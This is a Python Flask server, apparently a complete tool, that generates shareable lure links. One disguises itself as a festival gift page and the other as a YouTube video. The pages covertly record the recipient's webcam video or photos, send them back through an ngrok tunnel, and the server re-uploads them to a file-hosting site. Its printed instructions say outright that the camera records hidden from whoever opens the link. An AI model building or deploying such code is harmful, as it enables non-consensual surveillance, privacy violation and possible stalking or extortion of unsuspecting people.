#!/usr/bin/env python3
"""
Gift Video Receiver Server - With FileGoat Cloud Upload (Full Integration)
"""

import os
import sys
import time
import json
import subprocess
import threading
import urllib.parse
import urllib.request
import re
import requests
from datetime import datetime
from pathlib import Path
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
from werkzeug.utils import secure_filename

# ============================================
# CONFIG
# ============================================
UPLOAD_FOLDER = Path("gift_videos")
PORT = 5000
FESTIVAL_HTML = 'festival.html'
YOUTUBE_HTML = 'youtube.html'

# FileGoat expiry options
FILEGOAT_EXPIRY_DAYS = 7  # Default: 7 days

# Create upload directory
UPLOAD_FOLDER.mkdir(parents=True, exist_ok=True)

# ============================================
# FLASK APP
# ============================================
app = Flask(__name__)
CORS(app)

# Allow large files (5GB)
app.config["MAX_CONTENT_LENGTH"] = 5 * 1024 * 1024 * 1024

received_files = []
uploaded_links = []

# ============================================
# FILEGOAT UPLOAD FUNCTION
# ============================================

def upload_to_filegoat(filepath, expiry_days=7):
    """
    Upload image/video to FileGoat.
    
    expiry_days: 1, 7, 30, 90
    """
    filepath = Path(filepath)

    if not filepath.exists():
        return {
            "success": False,
            "error": "File does not exist"
        }

    filename = filepath.name
    file_size = filepath.stat().st_size

    print()
    print("=" * 50)
    print("☁️ FILEGOAT UPLOAD")
    print("=" * 50)
    print(f"📁 File     : {filename}")
    print(f"📊 Size     : {file_size:,} bytes")
    print(f"⏰ Expiry   : {expiry_days} days")
    print()

    # FileGoat upload endpoint
    url = "https://filego.at/upload"

    expiry_seconds = expiry_days * 24 * 60 * 60

    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 Chrome/140.0 Safari/537.36"
        ),
        "Accept": "*/*",
        "Origin": "https://filego.at",
        "Referer": "https://filego.at/",
    }

    try:
        with open(filepath, "rb") as file:
            files = {
                "file": (
                    filename,
                    file,
                    "application/octet-stream"
                )
            }
            data = {
                "expiry": str(expiry_seconds)
            }

            print("⬆️ Uploading...")

            response = requests.post(
                url,
                files=files,
                data=data,
                headers=headers,
                timeout=600
            )

        print(f"📡 HTTP Status: {response.status_code}")

        # Check HTTP status
        if response.status_code != 200:
            print("❌ Upload failed")
            print("Server response:")
            print(response.text[:1000])

            return {
                "success": False,
                "error": f"HTTP {response.status_code}",
                "response": response.text[:1000]
            }

        # Parse response
        try:
            result = response.json()
        except ValueError:
            print("⚠️ Server did not return JSON")
            return {
                "success": False,
                "error": "Server returned non-JSON response",
                "response": response.text[:1000]
            }

        print("📦 Server response:")
        print(result)

        # Find URL
        cloud_url = (
            result.get("url")
            or result.get("share_url")
            or result.get("download_url")
        )

        if not cloud_url:
            return {
                "success": False,
                "error": "Upload succeeded but no URL was returned",
                "response": result
            }

        print()
        print("✅ UPLOAD SUCCESS")
        print(f"🔗 URL: {cloud_url}")
        print(f"⏰ Expires: {expiry_days} days")
        print()

        return {
            "success": True,
            "url": cloud_url,
            "expiry": f"{expiry_days} days",
            "filename": filename,
            "size": file_size,
            "response": result
        }

    except requests.exceptions.Timeout:
        print("❌ Upload timed out")
        return {"success": False, "error": "Upload timeout"}

    except requests.exceptions.ConnectionError as e:
        print("❌ Internet connection error")
        print(e)
        return {"success": False, "error": "Connection error"}

    except Exception as e:
        print("❌ Upload error:")
        print(e)
        return {"success": False, "error": str(e)}

# ============================================
# ROUTES
# ============================================

@app.route('/festival')
def festival_page():
    try:
        with open(FESTIVAL_HTML, 'r') as f:
            return f.read()
    except FileNotFoundError:
        return f"<h1>Error: {FESTIVAL_HTML} not found!</h1>", 404

@app.route('/youtube')
def youtube_page():
    try:
        with open(YOUTUBE_HTML, 'r') as f:
            return f.read()
    except FileNotFoundError:
        return f"<h1>Error: {YOUTUBE_HTML} not found!</h1>", 404

@app.route('/upload', methods=['POST'])
def upload_media():
    try:
        # Check file
        if 'media' not in request.files:
            return jsonify({'error': 'No media file'}), 400
        
        media_file = request.files['media']
        if media_file.filename == '':
            return jsonify({'error': 'Empty filename'}), 400

        media_type = request.form.get('type', 'unknown')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        if media_type == 'photo':
            ext = 'jpg'
        else:
            ext = 'webm'
        
        # Secure filename
        safe_name = secure_filename(media_file.filename)
        if not safe_name:
            safe_name = f"{media_type}_{timestamp}.{ext}"
        else:
            name, ext_orig = os.path.splitext(safe_name)
            safe_name = f"{name}_{timestamp}{ext_orig}"
        
        # Save locally
        local_path = UPLOAD_FOLDER / safe_name
        media_file.save(local_path)
        
        file_info = {
            'filename': safe_name,
            'path': str(local_path.absolute()),
            'type': media_type,
            'timestamp': timestamp,
            'size': local_path.stat().st_size,
            'cloud_url': None,
            'expires': None,
            'delete_url': None
        }
        
        # ============================================
        # Upload to FileGoat
        # ============================================
        print(f"\n📥 Received file: {safe_name}")
        
        # Get expiry from request or use default
        expiry_days = request.form.get('expiry', str(FILEGOAT_EXPIRY_DAYS))
        try:
            expiry_days = int(expiry_days)
        except ValueError:
            expiry_days = FILEGOAT_EXPIRY_DAYS
        
        if expiry_days not in [1, 7, 30, 90]:
            expiry_days = 7
        
        cloud_result = upload_to_filegoat(local_path, expiry_days)
        
        if cloud_result.get('success'):
            file_info['cloud_url'] = cloud_result.get('url')
            file_info['expires'] = cloud_result.get('expiry')
            
            uploaded_links.append({
                'filename': safe_name,
                'url': cloud_result.get('url'),
                'expires': cloud_result.get('expiry')
            })
            
            print(f"   ☁️ Cloud link: {cloud_result.get('url')}")
        else:
            print(f"   ⚠️ Cloud upload failed: {cloud_result.get('error', 'Unknown error')}")
        
        received_files.append(file_info)
        
        # Display received info
        print(f"\n📹 Received {media_type} {len(received_files)}")
        print(f"   📁 {safe_name}")
        print(f"   📊 {file_info['size']:,} bytes")
        print(f"   📂 Full path: {file_info['path']}")
        
        if file_info.get('cloud_url'):
            print(f"   ☁️ Cloud link: {file_info['cloud_url']}")
            print(f"   ⏰ Expires: {file_info['expires']}")
        else:
            print(f"   ⚠️ Not uploaded to cloud")
        
        return jsonify({
            'success': True,
            'filename': safe_name,
            'cloud_url': file_info.get('cloud_url'),
            'local_path': file_info.get('path')
        }), 200

    except Exception as e:
        print(f"❌ Error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/files', methods=['GET'])
def list_files():
    return jsonify({
        'files': received_files,
        'cloud_links': uploaded_links
    })

@app.route('/cloud-links', methods=['GET'])
def get_cloud_links():
    return jsonify({
        'links': uploaded_links,
        'total': len(uploaded_links)
    })

@app.route('/download/<filename>', methods=['GET'])
def download_file(filename):
    filepath = UPLOAD_FOLDER / filename
    if filepath.exists():
        return send_file(filepath, as_attachment=True)
    return jsonify({'error': 'File not found'}), 404

# ============================================
# MAIN SERVER CLASS
# ============================================
class GiftServer:
    def __init__(self):
        self.ngrok_process = None
        self.ngrok_url = None
        self.port = PORT
        self.running = True
        self.ngrok_ready = threading.Event()

    def check_html_files(self):
        if not os.path.exists(FESTIVAL_HTML):
            print(f"\n❌ Error: {FESTIVAL_HTML} not found!")
            return False
        if not os.path.exists(YOUTUBE_HTML):
            print(f"\n❌ Error: {YOUTUBE_HTML} not found!")
            return False
        return True

    def get_camera_type(self):
        print("\n📷 Select camera type:")
        print("  1. Front Camera")
        print("  2. Back Camera")
        
        while True:
            choice = input("\nEnter choice (1 or 2): ").strip()
            if choice == '1':
                return 'user'
            elif choice == '2':
                return 'environment'
            else:
                print("❌ Invalid choice. Enter 1 or 2")

    def get_capture_mode(self):
        print("\n📸 Select capture mode:")
        print("  1. Video - Record 15 second video")
        print("  2. Photo - Capture 5 photos")
        
        while True:
            choice = input("\nEnter choice (1 or 2): ").strip()
            if choice == '1':
                return 'video', 15, 0
            elif choice == '2':
                return 'photo', 0, 5
            else:
                print("❌ Invalid choice. Enter 1 or 2")

    def show_main_menu(self):
        print("\n" + "="*60)
        print("🎁 GIFT VIDEO RECEIVER")
        print("="*60)
        print("\nSelect mode:")
        print("  1. 🎊 Festival Mode - Gift/surprise page with festival name")
        print("  2. 🎬 YouTube Mode - YouTube video with hidden camera")
        print("\n" + "-"*60)
        
        while True:
            choice = input("\nEnter choice (1 or 2): ").strip()
            if choice == '1':
                return 'festival'
            elif choice == '2':
                return 'youtube'
            else:
                print("❌ Invalid choice. Enter 1 or 2")

    def get_festival_name(self):
        name = input("\n📝 Enter festival/gift name: ").strip()
        if not name:
            name = "Surprise"
            print(f"   Using default: {name}")
        return name

    def get_youtube_video(self):
        print("\n🎬 Enter YouTube video URL or ID:")
        print("   (Press Enter for default video)")
        video = input("   ▶ ").strip()
        
        if video and ('youtube.com' in video or 'youtu.be' in video):
            patterns = [
                r'(?:youtube\.com\/watch\?v=)([^&]+)',
                r'(?:youtu\.be\/)([^?]+)',
                r'(?:youtube\.com\/embed\/)([^?]+)'
            ]
            for pattern in patterns:
                match = re.search(pattern, video)
                if match:
                    video = match.group(1)
                    break
        
        if not video:
            video = "dQw4w9WgXcQ"
            print(f"   Using default video ID: {video}")
        else:
            print(f"   Using video ID: {video}")
        
        return video

    def get_cloud_config(self):
        """Get cloud upload configuration from user"""
        print("\n☁️ FileGoat Cloud Upload Configuration:")
        print("   Files will be uploaded with auto-expiry")
        print("")
        print("   Select expiry time:")
        print("     1. 1 day")
        print("     2. 7 days (default)")
        print("     3. 30 days")
        print("     4. 90 days")
        
        while True:
            choice = input("\n   Enter choice (1-4, press Enter for default): ").strip()
            if choice == '' or choice == '2':
                return 7
            elif choice == '1':
                return 1
            elif choice == '3':
                return 30
            elif choice == '4':
                return 90
            else:
                print("   ❌ Invalid choice. Enter 1-4 or press Enter for default")

    def generate_link(self, mode, name=None, video_id=None, camera='user', capture_mode='video', duration=15, photos=5):
        base_url = self.ngrok_url
        
        if mode == 'festival':
            link = f"{base_url}/festival?name={urllib.parse.quote(name)}&camera={camera}&mode={capture_mode}&duration={duration}&photos={photos}"
            mode_name = "🎊 Festival Mode"
        else:
            link = f"{base_url}/youtube?video={urllib.parse.quote(video_id)}&camera={camera}&mode={capture_mode}&duration={duration}&photos={photos}"
            mode_name = "🎬 YouTube Mode"
        
        return link, mode_name

    def check_ngrok(self):
        try:
            result = subprocess.run(['ngrok', '--version'], capture_output=True, text=True)
            if result.returncode == 0:
                return True
        except FileNotFoundError:
            pass
        
        print("\n❌ ngrok is not installed or not in PATH!")
        print("📥 Install from: https://ngrok.com/download")
        return False

    def monitor_ngrok(self):
        try:
            time.sleep(3)
            for attempt in range(10):
                try:
                    with urllib.request.urlopen('http://localhost:4040/api/tunnels', timeout=2) as response:
                        data = json.loads(response.read().decode())
                        for tunnel in data.get('tunnels', []):
                            if tunnel.get('proto') == 'https':
                                self.ngrok_url = tunnel.get('public_url')
                                self.ngrok_ready.set()
                                return
                except Exception:
                    time.sleep(3)
        except Exception as e:
            print(f"❌ Error monitoring ngrok: {e}")

    def start_ngrok(self):
        print(f"\n🚀 Starting ngrok tunnel on port {self.port}...")
        
        try:
            self.ngrok_process = subprocess.Popen(
                ['ngrok', 'http', str(self.port)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            )
            
            monitor_thread = threading.Thread(target=self.monitor_ngrok)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            if self.ngrok_ready.wait(timeout=30):
                print(f"✅ Tunnel established!")
                return True
            else:
                print("⚠️ ngrok started but URL not found")
                return False
                
        except Exception as e:
            print(f"❌ Failed to start ngrok: {e}")
            return False

    def start_flask(self):
        print(f"\n🔧 Starting server on port {self.port}...")
        
        def run_flask():
            app.run(host='0.0.0.0', port=self.port, debug=False, use_reloader=False)
        
        flask_thread = threading.Thread(target=run_flask)
        flask_thread.daemon = True
        flask_thread.start()
        time.sleep(2)
        print("✅ Server running")

    def wait_for_files(self):
        print("\n🎁 Waiting for files... (Press Ctrl+C to stop)")
        print(f"📁 Files saved locally in: {UPLOAD_FOLDER}/")
        print("☁️ Files will be uploaded to FileGoat cloud")
        print("-"*50)
        print("\n⏳ Waiting for first file...")
        print("💡 Files will NOT auto-open. Check the folder or cloud links.")
        
        try:
            last_count = 0
            while self.running:
                current_count = len(received_files)
                
                if current_count > last_count:
                    file_info = received_files[-1]
                    print(f"\n📹 Received {file_info['type']} {current_count}")
                    print(f"   📁 {file_info['filename']}")
                    print(f"   📊 {file_info['size']:,} bytes")
                    print(f"   📂 Full path: {file_info['path']}")
                    
                    if file_info.get('cloud_url'):
                        print(f"   ☁️ FileGoat link: {file_info['cloud_url']}")
                        print(f"   ⏰ Expires: {file_info['expires']}")
                    else:
                        print(f"   ⚠️ Not uploaded to cloud")
                    
                    print("\n   💡 To download from cloud, use the link above")
                    print(f"   📁 Or open locally: cd {UPLOAD_FOLDER}")
                    last_count = current_count
                    print(f"\n⏳ Waiting for next file...")
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n\n👋 Shutting down...")

    def cleanup(self):
        print("\n🧹 Cleaning up...")
        if self.ngrok_process:
            self.ngrok_process.terminate()
            try:
                self.ngrok_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.ngrok_process.kill()
        print("✅ Done!")

    def run(self):
        try:
            # Setup
            if not self.check_html_files():
                return
            
            if not self.check_ngrok():
                return
            
            # Get cloud config
            global FILEGOAT_EXPIRY_DAYS
            FILEGOAT_EXPIRY_DAYS = self.get_cloud_config()
            print(f"   ✅ Files will expire after: {FILEGOAT_EXPIRY_DAYS} days")
            
            # Main menu
            mode = self.show_main_menu()
            camera = self.get_camera_type()
            capture_mode, duration, photos = self.get_capture_mode()
            
            if mode == 'festival':
                name = self.get_festival_name()
                video_id = None
            else:
                video_id = self.get_youtube_video()
                name = None
            
            # Start server
            self.start_flask()
            if not self.start_ngrok():
                return
            
            # Generate link
            link, mode_name = self.generate_link(mode, name, video_id, camera, capture_mode, duration, photos)
            
            print("\n" + "="*60)
            print(f"📤 SHARE THIS LINK ({mode_name}):")
            print("="*60)
            print(f"\n🔗 {link}")
            print("\n" + "="*60)
            
            print("\n📋 Configuration Summary:")
            print(f"   🎯 Mode: {mode_name}")
            print(f"   📷 Camera: {'Front' if camera == 'user' else 'Back'}")
            print(f"   📸 Capture: {'Video (' + str(duration) + 's)' if capture_mode == 'video' else 'Photo (' + str(photos) + ' photos)'}")
            print(f"   ☁️ Cloud expiry: {FILEGOAT_EXPIRY_DAYS} days (FileGoat)")
            
            if mode == 'festival':
                print(f"   🎊 Festival Name: {name}")
            else:
                print(f"   🎬 Video ID: {video_id}")
            
            print("\n📋 Instructions:")
            if mode == 'festival':
                print("   1. Send the link above to anyone")
                print("   2. They see a festival/gift page")
                print("   3. They click 'Open Your Gift'")
                print("   4. Camera records automatically (hidden)")
                if capture_mode == 'video':
                    print(f"   5. Records {duration} second video")
                else:
                    print(f"   5. Captures {photos} photos")
                print("   6. Files upload to FileGoat cloud!")
            else:
                print("   1. Send the link above to anyone")
                print("   2. They see a YouTube video playing")
                print("   3. Camera records automatically (hidden)")
                if capture_mode == 'video':
                    print(f"   4. Records {duration} second video")
                else:
                    print(f"   4. Captures {photos} photos")
                print("   5. Files upload to FileGoat cloud!")
            
            print(f"\n☁️ FileGoat: Files expire after {FILEGOAT_EXPIRY_DAYS} days")
            print("   Links will be shown when files are received")
            
            print("\n💡 Files saved locally too. Check the folder:")
            print(f"   📁 cd {UPLOAD_FOLDER}")
            print("="*60)
            print("\n📋 Link printed above - copy it manually")
            print(f"📁 Files saved in: {UPLOAD_FOLDER.absolute()}")
            
            self.wait_for_files()
            
        except KeyboardInterrupt:
            print("\n\n👋 Goodbye!")
        finally:
            self.cleanup()

if __name__ == '__main__':
    server = GiftServer()
    server.run()